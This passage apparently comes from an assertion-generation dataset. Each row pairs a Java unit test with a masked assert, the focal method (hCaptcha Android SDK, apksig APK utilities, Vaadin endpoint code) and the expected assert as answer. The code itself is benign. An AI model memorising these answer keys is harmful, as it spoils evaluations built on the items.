locale); expected.put(""size"", size.toString()); expected.put(""orientation"", orientation.toString()); expected.put(""theme"", HCaptchaTheme.DARK.toString()); expected.put(""customTheme"", JSONObject.NULL); expected.put(""host"", host); expected.put(""resetOnTimeout"", true); expected.put(""hideDialog"", true); expected.put(""tokenExpiration"", timeout); expected.put(""diagnosticLog"", true); expected.put(""disableHardwareAcceleration"", false);  JSONAssert.""<AssertPlaceHolder>""; }
getConfig() { return this.config; }"	assertEquals(jsInterface.getConfig(), expected, false)
"JSONException { final String siteKey = ""0000-1111-2222-3333""; final String locale = ""ro""; final HCaptchaSize size = HCaptchaSize.NORMAL; final HCaptchaOrientation orientation = HCaptchaOrientation.LANDSCAPE; final String rqdata = ""custom rqdata""; final long defaultTimeout = 120; final HCaptchaConfig config = HCaptchaConfig.builder() .siteKey(siteKey) .locale(locale) .size(size) .orientation(orientation) .theme(HCaptchaTheme.DARK) .rqdata(rqdata) .build(); final HCaptchaJSInterface jsInterface = new HCaptchaJSInterface(handler, config, captchaVerifier);  final JSONObject expected = new JSONObject(); expected.put(""siteKey"", siteKey); expected.put(""sentry"", true); expected.put(""loading"", true); expected.put(""rqdata"", rqdata); expected.put(""jsSrc"", ""https://js.hcaptcha.com/1/api.js""); expected.put(""endpoint"", JSONObject.NULL); expected.put(""reportapi"", JSONObject.NULL); expected.put(""assethost"", JSONObject.NULL); expected.put(""imghost"", JSONObject.NULL); expected.put(""locale"", locale); expected.put(""size"", size.toString()); expected.put(""orientation"", orientation.toString()); expected.put(""theme"", HCaptchaTheme.DARK.toString()); expected.put(""customTheme"", JSONObject.NULL); expected.put(""host"", JSONObject.NULL); expected.put(""resetOnTimeout"", false); expected.put(""hideDialog"", false); expected.put(""tokenExpiration"", defaultTimeout); expected.put(""diagnosticLog"", false); expected.put(""disableHardwareAcceleration"", true);  JSONAssert.""<AssertPlaceHolder>""; }
getConfig() { return this.config; }"	assertEquals(jsInterface.getConfig(), expected, false)
"on_pass_forwards_token_to_listeners() { final String token = ""mock-token""; final HCaptchaJSInterface jsInterface = new HCaptchaJSInterface(handler, testConfig, captchaVerifier); jsInterface.onPass(token); verify(captchaVerifier, times(1)).onSuccess(tokenCaptor.capture()); ""<AssertPlaceHolder>""; }
onPass(final String token) { HCaptchaLog.d(""JSInterface.onPass""); handler.post(() -> captchaVerifier.onSuccess(token)); }"	assertEquals(token, tokenCaptor.getValue())
"enum_to_string() { ""<AssertPlaceHolder>""; }
toString() { return size; }"	assertEquals(HCaptchaSize.INVISIBLE.getSize(), HCaptchaSize.INVISIBLE.toString())
"test_client_creation_via_activity() { ""<AssertPlaceHolder>""; }
getClient(@NonNull final Activity activity) { return new HCaptcha(activity, HCaptchaInternalConfig.builder().build()); }"	assertNotNull(HCaptcha.getClient(fragmentActivity))
"Exception { final ApplicationInfo applicationInfo = mock(ApplicationInfo.class); final Bundle bundle = mock(Bundle.class); when(bundle.getString(META_SITE_KEY)).thenReturn(HCaptchaConfigTest.MOCK_SITE_KEY); bundle.putString(META_SITE_KEY, HCaptchaConfigTest.MOCK_SITE_KEY); applicationInfo.metaData = bundle;  when(fragmentActivity.getPackageName()).thenReturn(TEST_PACKAGE_NAME); when(fragmentActivity.getPackageManager()).thenReturn(packageManager); when(packageManager.getApplicationInfo(TEST_PACKAGE_NAME, PackageManager.GET_META_DATA)) .thenReturn(applicationInfo);  ""<AssertPlaceHolder>""; }
setup() { final String siteKey; try { final ApplicationInfo app = HCaptchaCompat.getApplicationInfo(activity); final Bundle bundle = app.metaData; siteKey = bundle.getString(META_SITE_KEY); } catch (PackageManager.NameNotFoundException e) { throw new IllegalStateException(e); } if (siteKey == null) { throw new IllegalStateException(""The site-key is missing. You can pass it by adding "" + META_SITE_KEY + "" as meta-data to AndroidManifest.xml "" + ""or as an argument for setup/verifyWithHCaptcha methods.""); } return setup(siteKey); }"	assertNotNull(HCaptcha.getClient(fragmentActivity).setup())
"Exception { HCaptcha.getClient(fragmentActivity) .setup(HCaptchaConfigTest.MOCK_SITE_KEY) .verifyWithHCaptcha();  verify(packageManager, never()).getApplicationInfo(any(String.class), anyInt()); dialogFragmentMock.verify(() -> HCaptchaDialogFragment.newInstance( hCaptchaConfigCaptor.capture(), any(HCaptchaInternalConfig.class), any(HCaptchaStateListener.class)));  final HCaptchaConfig capturedConfig = hCaptchaConfigCaptor.getValue(); ""<AssertPlaceHolder>""; }
verifyWithHCaptcha() { if (captchaVerifier == null) { // Cold start at verification time. setup(); }  return startVerification(); }"	assertEquals(HCaptchaConfigTest.MOCK_SITE_KEY, capturedConfig.getSiteKey())
"Exception { HCaptcha.getClient(fragmentActivity) .setup(config) .verifyWithHCaptcha();  verify(packageManager, never()).getApplicationInfo(any(String.class), anyInt()); dialogFragmentMock.verify(() -> HCaptchaDialogFragment.newInstance( hCaptchaConfigCaptor.capture(), any(HCaptchaInternalConfig.class), any(HCaptchaStateListener.class)));  ""<AssertPlaceHolder>""; }
verifyWithHCaptcha() { if (captchaVerifier == null) { // Cold start at verification time. setup(); }  return startVerification(); }"	assertEquals(config, hCaptchaConfigCaptor.getValue())
"Exception { final ApplicationInfo applicationInfo = mock(ApplicationInfo.class); final Bundle bundle = mock(Bundle.class); when(bundle.getString(META_SITE_KEY)).thenReturn(HCaptchaConfigTest.MOCK_SITE_KEY); bundle.putString(META_SITE_KEY, HCaptchaConfigTest.MOCK_SITE_KEY); applicationInfo.metaData = bundle;  when(fragmentActivity.getPackageName()).thenReturn(TEST_PACKAGE_NAME); when(fragmentActivity.getPackageManager()).thenReturn(packageManager); when(packageManager.getApplicationInfo(TEST_PACKAGE_NAME, PackageManager.GET_META_DATA)) .thenReturn(applicationInfo);  try (MockedConstruction<HCaptchaWebView> mock = mockConstruction(HCaptchaWebView.class, withSettings().defaultAnswer(invocation -> { throw new AndroidRuntimeException( ""android.webkit.WebViewFactory$MissingWebViewPackageException""); }) )) { HCaptcha.getClient(fragmentActivity) .setup(config.toBuilder().hideDialog(true).build()) .verifyWithHCaptcha() .addOnFailureListener(e -> ""<AssertPlaceHolder>""; } }
verifyWithHCaptcha() { if (captchaVerifier == null) { // Cold start at verification time. setup(); }  return startVerification(); }"	assertEquals(HCaptchaError.ERROR, e.getHCaptchaError()))
"enum_to_string() { ""<AssertPlaceHolder>""; }
getTheme() { return this.theme; }"	assertEquals(HCaptchaTheme.DARK.getTheme(), HCaptchaTheme.DARK.getTheme())
"Exception { final CountDownLatch latch = new CountDownLatch(1); final HCaptchaStateListener listener = new HCaptchaStateTestAdapter() { @Override void onSuccess(String token) { ""<AssertPlaceHolder>""; latch.countDown(); } };  launchInContainer(listener); waitForWebViewToEmitToken(latch); }
onSuccess(final String token) { assert webViewHelper != null; if (isAdded()) { dismissAllowingStateLoss(); } listener.onSuccess(token); }"	assertEquals(TEST_TOKEN, token)
"Exception { final CountDownLatch latch = new CountDownLatch(1); final HCaptchaStateListener listener = new HCaptchaStateTestAdapter() { @Override void onFailure(HCaptchaException exception) { ""<AssertPlaceHolder>""; latch.countDown(); } };  launchInContainer(listener);  waitHCaptchaWebViewErrorByInput(latch, HCaptchaError.CHALLENGE_ERROR, AWAIT_CALLBACK_MS); }
onFailure(@NonNull final HCaptchaException exception) { final boolean silentRetry = webViewHelper != null && webViewHelper.shouldRetry(exception); if (isAdded() && !silentRetry) { dismissAllowingStateLoss(); } if (webViewHelper != null) { if (silentRetry) { webViewHelper.resetAndExecute(); } else { listener.onFailure(exception); } } }"	assertEquals(HCaptchaError.CHALLENGE_ERROR, exception.getHCaptchaError())
"Exception { final CountDownLatch failureLatch = new CountDownLatch(1); final CountDownLatch retryLatch = new CountDownLatch(1); final HCaptchaStateListener listener = new HCaptchaStateTestAdapter() {  @Override void onFailure(HCaptchaException exception) { failureLatch.countDown(); } };  final HCaptchaConfig updatedWithRetry = config.toBuilder() .retryPredicate((c, e) -> { retryLatch.countDown(); return e.getHCaptchaError() != HCaptchaError.NETWORK_ERROR; }) .build();  launchInContainer(updatedWithRetry, listener);  waitHCaptchaWebViewErrorByInput(retryLatch, HCaptchaError.NETWORK_ERROR, AWAIT_CALLBACK_MS);  ""<AssertPlaceHolder>""; }
onFailure(@NonNull final HCaptchaException exception) { final boolean silentRetry = webViewHelper != null && webViewHelper.shouldRetry(exception); if (isAdded() && !silentRetry) { dismissAllowingStateLoss(); } if (webViewHelper != null) { if (silentRetry) { webViewHelper.resetAndExecute(); } else { listener.onFailure(exception); } } }"	assertTrue(failureLatch.await(AWAIT_CALLBACK_MS, TimeUnit.MILLISECONDS))
"Exception { final CountDownLatch successLatch = new CountDownLatch(1); final HCaptchaStateListener listener = new HCaptchaStateTestAdapter() {  @Override void onSuccess(String token) { successLatch.countDown(); } };  final FragmentScenario<HCaptchaDialogFragment> scenario = launchInContainer(config, listener); scenario.moveToState(Lifecycle.State.STARTED).moveToState(Lifecycle.State.RESUMED);  waitHCaptchaWebViewToken(successLatch, AWAIT_CALLBACK_MS);  ""<AssertPlaceHolder>""; }
onSuccess(final String token) { assert webViewHelper != null; if (isAdded()) { dismissAllowingStateLoss(); } listener.onSuccess(token); }"	assertTrue(successLatch.await(AWAIT_CALLBACK_MS, TimeUnit.MILLISECONDS))
"Exception { final CountDownLatch successLatch = new CountDownLatch(1); final HCaptchaStateListener listener = new HCaptchaStateTestAdapter() {  @Override void onSuccess(String token) { successLatch.countDown(); } };  final FragmentScenario<HCaptchaDialogFragment> scenario = launchInContainer(config, listener); scenario.recreate();  waitHCaptchaWebViewToken(successLatch, AWAIT_CALLBACK_MS);  ""<AssertPlaceHolder>""; }
onSuccess(final String token) { assert webViewHelper != null; if (isAdded()) { dismissAllowingStateLoss(); } listener.onSuccess(token); }"	assertTrue(successLatch.await(AWAIT_CALLBACK_MS, TimeUnit.MILLISECONDS))
"InterruptedException { final CountDownLatch latch = new CountDownLatch(1); try (ActivityScenario<TestActivity> scenario = ActivityScenario.launch(TestActivity.class)) { scenario.moveToState(Lifecycle.State.CREATED).onActivity(activity -> { HCaptchaDialogFragment.newInstance(config, internalConfig, new HCaptchaStateTestAdapter()) .startVerification(activity); latch.countDown(); }); } ""<AssertPlaceHolder>""; }
startVerification(@NonNull Activity fragmentActivity) { final FragmentManager fragmentManager = ((FragmentActivity) fragmentActivity).getSupportFragmentManager(); final Fragment oldFragment = fragmentManager.findFragmentByTag(HCaptchaDialogFragment.TAG); if (oldFragment != null && oldFragment.isAdded()) { HCaptchaLog.w(""DialogFragment was already added.""); return; }  try { show(fragmentManager, HCaptchaDialogFragment.TAG); } catch (IllegalStateException e) { HCaptchaLog.w(""DialogFragment.startVerification "" + e.getMessage()); // https://stackoverflow.com/q/14262312/902217 // Happens if Fragment is stopped i.e. activity is about to destroy on show call if (webViewHelper != null) { listener.onFailure(new HCaptchaException(HCaptchaError.ERROR)); } } }"	assertTrue(latch.await(AWAIT_CALLBACK_MS, TimeUnit.MILLISECONDS))
"Exception { final CountDownLatch failureLatch = new CountDownLatch(1); final CountDownLatch retryLatch = new CountDownLatch(1); final HCaptchaStateListener listener = new HCaptchaStateTestAdapter() {  @Override void onSuccess(String token) { failAsNonReachable(); }  @Override void onFailure(HCaptchaException exception) { failureLatch.countDown(); } };  final HCaptchaConfig updatedWithRetry = config.toBuilder() .retryPredicate((c, e) -> { retryLatch.countDown(); return e.getHCaptchaError() != HCaptchaError.NETWORK_ERROR; }) .build();  final ActivityScenario<TestActivity> scenario = rule.getScenario(); scenario.onActivity(activity -> { final HCaptchaHeadlessWebView subject = new HCaptchaHeadlessWebView( activity, updatedWithRetry, internalConfig, listener); subject.startVerification(activity); });  waitHCaptchaWebViewError(retryLatch, HCaptchaError.NETWORK_ERROR, AWAIT_CALLBACK_MS);  ""<AssertPlaceHolder>""; }
startVerification(@NonNull Activity activity) { if (webViewLoaded) { // Safe to execute webViewHelper.resetAndExecute(); } else { shouldExecuteOnLoad = true; } }"	assertTrue(failureLatch.await(AWAIT_CALLBACK_MS, TimeUnit.MILLISECONDS))
"Exception { final CountDownLatch latch = new CountDownLatch(1);  final ActivityScenario<TestActivity> scenario = rule.getScenario(); scenario.onActivity(activity -> { final HCaptchaHeadlessWebView subject = new HCaptchaHeadlessWebView( activity, config, internalConfig, new HCaptchaStateTestAdapter());  final ViewGroup rootView = (ViewGroup) activity.getWindow().getDecorView().getRootView(); final View webView = rootView.findViewById(R.id.webView); webView.addOnAttachStateChangeListener(new View.OnAttachStateChangeListener() { @Override public void onViewAttachedToWindow(@NonNull View view) { // will not be fired because attached already }  @Override public void onViewDetachedFromWindow(@NonNull View view) { latch.countDown(); } }); subject.reset(); });  ""<AssertPlaceHolder>""; }
reset() { if (webViewLoaded) { webViewHelper.reset(); final WebView webView = webViewHelper.getWebView(); if (webView.getParent() != null) { ((ViewGroup) webView.getParent()).removeView(webView); } } else { shouldResetOnLoad = true; } }"	assertTrue(latch.await(AWAIT_CALLBACK_MS, TimeUnit.MILLISECONDS))
"Exception { // This file contains the lineage with the first two rsa-2048 signers SigningCertificateLineage lineage = Resources.toSigningCertificateLineage(getClass(), ""rsa-2048-lineage-2-signers""); SignerConfig unknownSigner = Resources.toLineageSignerConfig(getClass(), THIRD_RSA_2048_SIGNER_RESOURCE_NAME); ""<AssertPlaceHolder>""; }
isSignerInLineage(SignerConfig config) { if (config == null) { throw new NullPointerException(""config == null""); }  X509Certificate cert = config.getCertificate(); return isCertificateInLineage(cert); }"	"assertFalse(""The signer "" + unknownSigner.getCertificate().getSubjectDN() + "" should not be in the lineage"", lineage.isSignerInLineage(unknownSigner))"
"Exception { ByteBuffer manifest = getAndroidManifest(""original.apk""); ""<AssertPlaceHolder>""; }
getMinSdkVersionFromBinaryAndroidManifest( ByteBuffer androidManifestContents) throws MinSdkVersionException { // IMPLEMENTATION NOTE: Minimum supported Android platform version number is declared using // uses-sdk elements which are children of the top-level manifest element. uses-sdk element // declares the minimum supported platform version using the android:minSdkVersion attribute // whose default value is 1. // For each encountered uses-sdk element, the Android runtime checks that its minSdkVersion // is not higher than the runtime's API Level and rejects APKs if it is higher. Thus, the // effective minSdkVersion value is the maximum over the encountered minSdkVersion values.  try { // If no uses-sdk elements are encountered, Android accepts the APK. We treat this // scenario as though the minimum supported API Level is 1. int result = 1;  AndroidBinXmlParser parser = new AndroidBinXmlParser(androidManifestContents); int eventType = parser.getEventType(); while (eventType != AndroidBinXmlParser.EVENT_END_DOCUMENT) { if ((eventType == AndroidBinXmlParser.EVENT_START_ELEMENT) && (parser.getDepth() == 2) && (""uses-sdk"".equals(parser.getName())) && (parser.getNamespace().isEmpty())) { // In each uses-sdk element, minSdkVersion defaults to 1 int minSdkVersion = 1; for (int i = 0; i < parser.getAttributeCount(); i++) { if (parser.getAttributeNameResourceId(i) == MIN_SDK_VERSION_ATTR_ID) { int valueType = parser.getAttributeValueType(i); switch (valueType) { case AndroidBinXmlParser.VALUE_TYPE_INT: minSdkVersion = parser.getAttributeIntValue(i); break; case AndroidBinXmlParser.VALUE_TYPE_STRING: minSdkVersion = getMinSdkVersionForCodename( parser.getAttributeStringValue(i)); break; default: throw new MinSdkVersionException( ""Unable to determine APK's minimum supported Android"" + "": unsupported value type in "" + ANDROID_MANIFEST_ZIP_ENTRY_NAME + ""'s"" + "" minSdkVersion"" + "". Only integer values supported.""); } break; } } result = Math.max(result, minSdkVersion); } eventType = parser.next(); }  return result; } catch (AndroidBinXmlParser.XmlParserException e) { throw new MinSdkVersionException( ""Unable to determine APK's minimum supported Android platform version"" + "": malformed binary resource: "" + ANDROID_MANIFEST_ZIP_ENTRY_NAME, e); } }"	assertEquals(23, ApkUtils.getMinSdkVersionFromBinaryAndroidManifest(manifest))
"Exception { ByteBuffer manifest = getAndroidManifest(""original.apk""); ""<AssertPlaceHolder>""; }
getPackageNameFromBinaryAndroidManifest( ByteBuffer androidManifestContents) throws ApkFormatException { // IMPLEMENTATION NOTE: Package name is declared as the ""package"" attribute of the top-level // manifest element. Interestingly, as opposed to most other attributes, Android Package // Manager looks up this attribute by its name rather than by its resource ID.  try { AndroidBinXmlParser parser = new AndroidBinXmlParser(androidManifestContents); int eventType = parser.getEventType(); while (eventType != AndroidBinXmlParser.EVENT_END_DOCUMENT) { if ((eventType == AndroidBinXmlParser.EVENT_START_ELEMENT) && (parser.getDepth() == 1) && (""manifest"".equals(parser.getName())) && (parser.getNamespace().isEmpty())) { for (int i = 0; i < parser.getAttributeCount(); i++) { if (""package"".equals(parser.getAttributeName(i)) && (parser.getNamespace().isEmpty())) { return parser.getAttributeStringValue(i); } } // No ""package"" attribute found return null; } eventType = parser.next(); }  // No manifest element found return null; } catch (AndroidBinXmlParser.XmlParserException e) { throw new ApkFormatException( ""Unable to determine APK package name: malformed binary resource: "" + ANDROID_MANIFEST_ZIP_ENTRY_NAME, e); } }"	"assertEquals( ""android.appsecurity.cts.tinyapp"", ApkUtils.getPackageNameFromBinaryAndroidManifest(manifest))"
"Exception { ByteBuffer manifest = getAndroidManifest(""original.apk""); MessageDigest md = MessageDigest.getInstance(""SHA-256""); md.update(manifest); byte[] actualDigest = md.digest(); ""<AssertPlaceHolder>""; }
getAndroidManifest(DataSource apk) throws IOException, ApkFormatException { ZipSections zipSections; try { zipSections = findZipSections(apk); } catch (ZipFormatException e) { throw new ApkFormatException(""Not a valid ZIP archive"", e); } List<CentralDirectoryRecord> cdRecords = V1SchemeVerifier.parseZipCentralDirectory(apk, zipSections); CentralDirectoryRecord androidManifestCdRecord = null; for (CentralDirectoryRecord cdRecord : cdRecords) { if (ANDROID_MANIFEST_ZIP_ENTRY_NAME.equals(cdRecord.getName())) { androidManifestCdRecord = cdRecord; break; } } if (androidManifestCdRecord == null) { throw new ApkFormatException(""Missing "" + ANDROID_MANIFEST_ZIP_ENTRY_NAME); } DataSource lfhSection = apk.slice(0, zipSections.getZipCentralDirectoryOffset());  try { return ByteBuffer.wrap( LocalFileRecord.getUncompressedData( lfhSection, androidManifestCdRecord, lfhSection.size())); } catch (ZipFormatException e) { throw new ApkFormatException(""Failed to read "" + ANDROID_MANIFEST_ZIP_ENTRY_NAME, e); } }"	"assertEquals( ""8b3de63a282652221162cdc327f424924ac3c7c24e642035975a1ee7a395c4dc"", HexEncoding.encode(actualDigest))"
"Exception { byte[] fullFileContent = createFileContent(1024 * 1024 + 987654); RandomAccessFile raf = createRaf(fullFileContent); DataSource rafDataSource = new FileChannelDataSource(raf.getChannel());  ByteArrayDataSink dataSink = new ByteArrayDataSink();  int bytesToFeed = 1024 * 1024 + 12345; rafDataSource.feed(0, bytesToFeed, dataSink);  byte[] expectedBytes = Arrays.copyOf(fullFileContent, bytesToFeed);  byte[] resultBytes = getDataSinkBytes(dataSink);  ""<AssertPlaceHolder>""; }
feed(long offset, long size, DataSink sink) throws IOException { long sourceSize = size(); checkChunkValid(offset, size, sourceSize); if (size == 0) { return; }  long chunkOffsetInFile = mOffset + offset; long remaining = size; ByteBuffer buf = ByteBuffer.allocateDirect((int) Math.min(remaining, MAX_READ_CHUNK_SIZE));  while (remaining > 0) { int chunkSize = (int) Math.min(remaining, buf.capacity()); int chunkRemaining = chunkSize; buf.limit(chunkSize); synchronized (mChannel) { mChannel.position(chunkOffsetInFile); while (chunkRemaining > 0) { int read = mChannel.read(buf); if (read < 0) { throw new IOException(""Unexpected EOF encountered""); } chunkRemaining -= read; } } buf.flip(); sink.consume(buf); buf.clear(); chunkOffsetInFile += chunkSize; remaining -= chunkSize; } }"	assertArrayEquals(expectedBytes, resultBytes)
"Exception { byte[] fullFileContent = createFileContent(1024 * 1024 + 987654); RandomAccessFile raf = createRaf(fullFileContent); DataSource rafDataSource = new FileChannelDataSource(raf.getChannel());  ByteArrayDataSink dataSink = new ByteArrayDataSink();  int offset = 23456; int bytesToFeed = 1024 * 1024 + 12345; rafDataSource.feed(offset, bytesToFeed, dataSink);  byte[] expectedBytes = Arrays.copyOfRange(fullFileContent, offset, offset + bytesToFeed);  byte[] resultBytes = getDataSinkBytes(dataSink);  ""<AssertPlaceHolder>""; }
feed(long offset, long size, DataSink sink) throws IOException { long sourceSize = size(); checkChunkValid(offset, size, sourceSize); if (size == 0) { return; }  long chunkOffsetInFile = mOffset + offset; long remaining = size; ByteBuffer buf = ByteBuffer.allocateDirect((int) Math.min(remaining, MAX_READ_CHUNK_SIZE));  while (remaining > 0) { int chunkSize = (int) Math.min(remaining, buf.capacity()); int chunkRemaining = chunkSize; buf.limit(chunkSize); synchronized (mChannel) { mChannel.position(chunkOffsetInFile); while (chunkRemaining > 0) { int read = mChannel.read(buf); if (read < 0) { throw new IOException(""Unexpected EOF encountered""); } chunkRemaining -= read; } } buf.flip(); sink.consume(buf); buf.clear(); chunkOffsetInFile += chunkSize; remaining -= chunkSize; } }"	assertArrayEquals(expectedBytes, resultBytes)
"Exception { byte[] fullFileContent = createFileContent(3 * 1024 * 1024 + 987654); RandomAccessFile raf = createRaf(fullFileContent); DataSource rafDataSource = new FileChannelDataSource(raf.getChannel());  ByteArrayDataSink dataSink = new ByteArrayDataSink();  int offset = 23456; int bytesToFeed = 2 * 1024 * 1024 + 12345; rafDataSource.feed(offset, bytesToFeed, dataSink);  byte[] expectedBytes = Arrays.copyOfRange(fullFileContent, offset, offset + bytesToFeed);  byte[] resultBytes = getDataSinkBytes(dataSink);  ""<AssertPlaceHolder>""; }
feed(long offset, long size, DataSink sink) throws IOException { long sourceSize = size(); checkChunkValid(offset, size, sourceSize); if (size == 0) { return; }  long chunkOffsetInFile = mOffset + offset; long remaining = size; ByteBuffer buf = ByteBuffer.allocateDirect((int) Math.min(remaining, MAX_READ_CHUNK_SIZE));  while (remaining > 0) { int chunkSize = (int) Math.min(remaining, buf.capacity()); int chunkRemaining = chunkSize; buf.limit(chunkSize); synchronized (mChannel) { mChannel.position(chunkOffsetInFile); while (chunkRemaining > 0) { int read = mChannel.read(buf); if (read < 0) { throw new IOException(""Unexpected EOF encountered""); } chunkRemaining -= read; } } buf.flip(); sink.consume(buf); buf.clear(); chunkOffsetInFile += chunkSize; remaining -= chunkSize; } }"	assertArrayEquals(expectedBytes, resultBytes)
"Exception { // This test verifies the generateCertificates method returns an empty Collection of // Certificates when provided an empty InputStream. ""<AssertPlaceHolder>""; }
generateCertificates( InputStream in) throws CertificateException { if (sCertFactory == null) { buildCertFactory(); } return generateCertificates(in, sCertFactory); }"	"assertEquals( ""Zero certificates should be returned when passing an empty InputStream to "" + ""generateCertificates"", 0, X509CertificateUtils.generateCertificates( new ByteArrayInputStream(new byte[0])).size())"
"should_NotUseBridgeMethod_When_EndpointHasBridgeMethodFromInterface() { String inputId = ""2222""; String expectedResult = String.format(""{""id"":""%s""}"", inputId); BridgeMethodTestEndpoint.InheritedClass testEndpoint = new BridgeMethodTestEndpoint.InheritedClass(); String testMethodName = ""testMethodFromInterface""; ResponseEntity<String> response = createVaadinController(testEndpoint) .serveEndpoint(testEndpoint.getClass().getSimpleName(), testMethodName, createRequestParameters(String.format( ""{""value"": {""id"": ""%s""}}"", inputId)), requestMock); ""<AssertPlaceHolder>""; }
serveEndpoint( @PathVariable(""endpoint"") String endpointName, @PathVariable(""method"") String methodName, @RequestBody(required = false) ObjectNode body, HttpServletRequest request, HttpServletResponse response) { return doServeEndpoint(endpointName, methodName, body, request, response); }"	assertEquals(expectedResult, response.getBody())
"should_NotUseBridgeMethod_When_EndpointHasBridgeMethodFromParentClass() { String inputId = ""2222""; BridgeMethodTestEndpoint.InheritedClass testEndpoint = new BridgeMethodTestEndpoint.InheritedClass(); String testMethodName = ""testMethodFromClass"";  ResponseEntity<String> response = createVaadinController(testEndpoint) .serveEndpoint(testEndpoint.getClass().getSimpleName(), testMethodName, createRequestParameters( String.format(""{""value"": %s}"", inputId)), requestMock); ""<AssertPlaceHolder>""; }
serveEndpoint( @PathVariable(""endpoint"") String endpointName, @PathVariable(""method"") String methodName, @RequestBody(required = false) ObjectNode body, HttpServletRequest request, HttpServletResponse response) { return doServeEndpoint(endpointName, methodName, body, request, response); }"	assertEquals(inputId, response.getBody())
"should_ReturnCorrectResponse_When_CallingNormalOverriddenMethod() { String inputId = ""2222""; BridgeMethodTestEndpoint.InheritedClass testEndpoint = new BridgeMethodTestEndpoint.InheritedClass(); String testMethodName = ""testNormalMethod"";  ResponseEntity<String> response = createVaadinController(testEndpoint) .serveEndpoint(testEndpoint.getClass().getSimpleName(), testMethodName, createRequestParameters( String.format(""{""value"": %s}"", inputId)), requestMock); ""<AssertPlaceHolder>""; }
serveEndpoint( @PathVariable(""endpoint"") String endpointName, @PathVariable(""method"") String methodName, @RequestBody(required = false) ObjectNode body, HttpServletRequest request, HttpServletResponse response) { return doServeEndpoint(endpointName, methodName, body, request, response); }"	assertEquals(inputId, response.getBody())
"should_ReturnNoErrors_When_ValidEndpointNameGiven() { String validationResult = checker.check(""ordinaryName"");  ""<AssertPlaceHolder>""; }
check(String endpointName) { if (endpointName == null || endpointName.isEmpty()) { return ""Endpoint name cannot be blank""; } if (ECMA_SCRIPT_RESERVED_WORDS.contains(endpointName)) { return ""Endpoint name cannot be equal to JavaScript reserved words""; } if (WHITESPACE_PATTERN.matcher(endpointName).find()) { return ""Endpoint name cannot contain any whitespaces""; } return null; }"	assertNull(validationResult)
"endpointWithContextPath() { MockHttpServletRequest request = new MockHttpServletRequest(); request.setRequestURI( ""/context/connect/AnonymousAllowedEndpoint/noAnnotation""); request.setContextPath(""/context""); Assert.""<AssertPlaceHolder>""; }
isEndpointRequest(HttpServletRequest request) { return getEndpoint(request).isPresent(); }"	assertTrue(endpointUtil.isEndpointRequest(request))
"should_ReturnNull_When_GivenNonNullValue_ForDateType() { Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNull(explicitNullableTypeChecker .checkValueForType(new Date(), Date.class, false))
"should_ReturnNull_When_GivenNonNullValue_ForDateTimeType() { Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNull(explicitNullableTypeChecker.checkValueForType( LocalDateTime.now(), LocalDateTime.class, false))
"should_ReturnNull_When_GivenNonNullValue_ForLocalTimeType() { Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNull(explicitNullableTypeChecker .checkValueForType(LocalTime.now(), LocalTime.class, false))
"should_ReturnNull_When_GivenNonNullValue_ForObjectType() { Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNull(explicitNullableTypeChecker .checkValueForType(new Object(), Object.class, false))
"should_ReturnNull_When_GivenNonNullValue_ForOptionalType() { Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNull(explicitNullableTypeChecker .checkValueForType(Optional.empty(), Optional.class, false))
"should_ReturnNull_When_GivenNonNullValue_ForCollectionType() { Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNull(explicitNullableTypeChecker.checkValueForType( new ArrayList<String>(), stringListType, false))
"should_ReturnNull_When_GivenNonNull_BeanProperties() { final Bean bean = new Bean(); bean.setTitle(""foo"");  Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNull(explicitNullableTypeChecker.checkValueForType(bean, Bean.class, false))
"should_ReturnNull_When_GivenNonNull_Generic_BeanProperties() { final Person person = new Person(); person.setName(""foo""); person.setId(1);  Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNull(explicitNullableTypeChecker.checkValueForType(person, Person.class, false))
"should_ReturnNull_When_GivenNullAndNotRequiredByContext() { Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNotNull(explicitNullableTypeChecker.checkValueForType(null, Employee.class, false))
"should_ReturnError_When_GivenNullAndRequiredByContext() { Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNotNull(explicitNullableTypeChecker.checkValueForType(null, Employee.class, true))
"should_ReturnError_When_GivenNestedNullAndRequiredByContext() { Employee employee = new Employee(); employee.setId(12); employee.setCompany(null); Assert.""<AssertPlaceHolder>""; }
checkValueForType(Object value, Type expectedType, boolean requiredByContext) { return new ExplicitNullableTypeCheckerHelper(requiredByContext) .checkValueForType(value, expectedType); }"	assertNotNull(explicitNullableTypeChecker .checkValueForType(employee, Employee.class, true))
